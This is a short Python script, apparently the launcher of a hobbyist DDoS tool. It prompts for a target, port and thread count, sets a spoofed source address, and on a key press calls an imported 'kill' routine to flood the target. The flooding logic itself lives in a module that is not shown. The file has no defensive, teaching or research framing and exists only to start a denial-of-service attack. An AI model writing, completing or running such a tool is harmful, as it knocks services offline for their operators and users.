from user import info
from the_ddoser import KILEM
import keyboard

col = info
ddos = KILEM


fake_ip = "192.05.24.04"
wtd = col.what_to_ddos()
port = col.get_port()
num_of_threads = col.h_many_thr()

print('Press D to START DDoSing')
print('To STOP press "S"')
keyboard.wait('D')
ddos.kill(wtd, num_of_threads, fake_ip, port)

keyboard.wait("Esc")